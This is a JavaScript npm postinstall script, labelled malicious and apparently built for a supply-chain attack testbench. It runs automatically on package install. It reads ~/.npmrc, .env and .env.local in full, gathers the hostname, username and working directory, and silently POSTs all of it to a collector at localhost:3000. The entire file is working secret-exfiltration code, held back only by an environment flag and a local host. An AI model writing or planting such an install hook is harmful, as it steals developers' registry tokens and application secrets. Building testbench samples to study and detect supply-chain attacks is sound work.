/**
 * MALICIOUS POSTINSTALL SCRIPT
 * This executes automatically when the package is installed
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'data-processor',
    version: '1.2.1',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      // In real attack, would collect more sensitive env vars
    },
    files: {}
  };

  // Try to read sensitive files (simulated)
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local')
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server (localhost in testbench)
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

